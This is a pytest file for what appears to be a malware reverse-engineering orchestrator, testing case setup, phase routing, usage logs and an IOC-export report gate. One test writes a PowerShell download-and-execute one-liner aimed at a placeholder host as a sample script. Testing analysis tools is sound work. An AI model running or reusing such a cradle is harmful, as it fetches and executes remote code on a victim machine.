"""ReverseOrchestrator: case setup, phase routing, usage log, report gate plumbing."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from mulder.orchestrator.reverse_runner import ReverseOrchestrator, SampleCaseError
from mulder.orchestrator.types import InvestigationResult, PhaseResult


def _make(sample: Path, tmp_path: Path, case_id: str = "rev-case") -> ReverseOrchestrator:
    with patch("mulder.orchestrator.runner.InvestigationDashboard"):
        return ReverseOrchestrator(
            sample_path=sample,
            cwd=tmp_path / "ws",
            case_id=case_id,
            db_dir=tmp_path / "cases",
        )


def _pe(tmp_path: Path, name: str = "s.exe") -> Path:
    import struct

    head = bytearray(512)
    head[:2] = b"MZ"
    struct.pack_into("<I", head, 0x3C, 0x80)
    head[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<H", head, 0x80 + 24, 0x20B)
    p = tmp_path / "samples" / name
    p.parent.mkdir(exist_ok=True)
    p.write_bytes(bytes(head))
    return p


def test_prepare_case_records_the_sample(tmp_path: Path) -> None:
    from mulder.reverse.state import CASE_KIND_KEY, SAMPLE_KEY
    from mulder.server.app import get_ctx

    sample = _pe(tmp_path)
    orch = _make(sample, tmp_path)
    orch.prepare_case()
    db = get_ctx().db
    assert db.get_kv(CASE_KIND_KEY) == "reverse"
    assert db.get_kv(SAMPLE_KEY) == str(sample)
    assert orch.sample_kind == "pe"
    assert [r["file_path"] for r in db.get_evidence_registry()] == [str(sample)]
    assert orch._prompt_vars["sample_sha256"] == orch.sample_sha256
    # Re-running on the same case and sample is allowed and registers nothing twice.
    orch.prepare_case()
    assert len(get_ctx().db.get_evidence_registry()) == 1


def test_prepare_case_refuses_another_sample_in_the_same_case(tmp_path: Path) -> None:
    _make(_pe(tmp_path, "a.exe"), tmp_path).prepare_case()
    with pytest.raises(SampleCaseError, match="already analyses"):
        _make(_pe(tmp_path, "b.exe"), tmp_path).prepare_case()


def test_prepare_case_refuses_a_missing_sample(tmp_path: Path) -> None:
    with pytest.raises(SampleCaseError, match="not found"):
        _make(tmp_path / "nope.exe", tmp_path).prepare_case()


def test_snapshot_reads_the_case(tmp_path: Path) -> None:
    orch = _make(_pe(tmp_path), tmp_path)
    orch.prepare_case()
    snap = orch.snapshot()
    assert snap["sample_kind"] == "pe"
    assert snap["findings_count"] == 0
    assert snap["status"]["priorities"] == []
    assert snap["project_file"] is None


def _status(packed: bool = False) -> dict[str, Any]:
    return {"packed": {"reason": "UPX"} if packed else None}


async def _run(
    orch: ReverseOrchestrator, sources: list[str], packed: bool = False
) -> tuple[list[str], InvestigationResult]:
    ran: list[str] = []

    async def split(phase: Any, prompt_vars: Any = None, **_: Any) -> PhaseResult:
        ran.append(phase.name)
        assert prompt_vars["sample_path"] == str(orch.sample)
        return PhaseResult(phase_name=phase.name, success=True)

    async def single(phase: Any, prompt_vars: Any = None) -> PhaseResult:
        ran.append(phase.name)
        return PhaseResult(phase_name=phase.name, success=True)

    snap = {"sources": sources, "status": _status(packed)}
    with (
        patch.object(orch, "_run_split_phase", side_effect=split),
        patch.object(orch, "_run_single_phase", side_effect=single),
        patch.object(orch, "snapshot", return_value=snap),
    ):
        result = await orch._run_pipeline(InvestigationResult())
    return ran, result


async def test_native_sample_runs_every_phase(tmp_path: Path) -> None:
    orch = _make(_pe(tmp_path), tmp_path)
    ran, result = await _run(orch, ["reverse.program", "capa.analysis"])
    assert ran == ["re_triage", "re_mapping", "re_deep", "re_counter", "re_report"]
    assert result.success
    usage = json.loads((tmp_path / "cases" / "rev-case.phase_usage.json").read_text())
    assert [u["phase"] for u in usage] == ran


async def test_packed_sample_stops_after_mapping(tmp_path: Path) -> None:
    orch = _make(_pe(tmp_path), tmp_path)
    ran, result = await _run(orch, ["reverse.program"], packed=True)
    assert ran == ["re_triage", "re_mapping", "re_report"]
    skipped = [p.phase_name for p in result.phases if p.phase_name not in ran]
    assert skipped == ["re_deep", "re_counter"]


async def test_sample_the_disassembler_could_not_load(tmp_path: Path) -> None:
    orch = _make(_pe(tmp_path), tmp_path)
    ran, _ = await _run(orch, [])
    assert ran == ["re_triage", "re_mapping", "re_counter", "re_report"]


async def test_script_skips_the_disassembler_phases(tmp_path: Path) -> None:
    script = tmp_path / "samples" / "drop.ps1"
    script.parent.mkdir()
    script.write_text("IEX (New-Object Net.WebClient).DownloadString('http://x.invalid')")
    orch = _make(script, tmp_path)
    ran, result = await _run(orch, [])
    assert ran == ["re_triage", "re_counter", "re_report"]
    assert orch.sample_kind == "script"
    assert [p.phase_name for p in result.phases] == [
        "re_triage",
        "re_mapping",
        "re_deep",
        "re_counter",
        "re_report",
    ]


async def test_report_gate_exports_iocs(tmp_path: Path) -> None:
    import time

    orch = _make(_pe(tmp_path), tmp_path)
    orch.prepare_case()
    orch._phase_started_at = time.time() - 5
    report = tmp_path / "cases" / "rev-case.report.md"
    report.write_text("# report\n")
    from mulder.orchestrator.reverse_phases import RE_REPORT

    gate = await orch._validate_phase(RE_REPORT, PhaseResult(phase_name="re_report"))
    assert gate is not None
    names = {c.name: c.passed for c in gate.checks}
    assert names["report_written"] is True
    assert "iocs_exported" in names


def test_cli_refuses_an_unusable_backend(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from click.testing import CliRunner

    from mulder.cli import cli
    from mulder.reverse.ghidra_backend import GhidraBackend

    monkeypatch.setattr(GhidraBackend, "check", lambda self: "Ghidra was not found")
    sample = _pe(tmp_path)
    out = CliRunner().invoke(cli, ["reverse", str(sample), "c1", "--db-dir", str(tmp_path / "db")])
    assert out.exit_code != 0
    assert "Ghidra was not found" in out.output
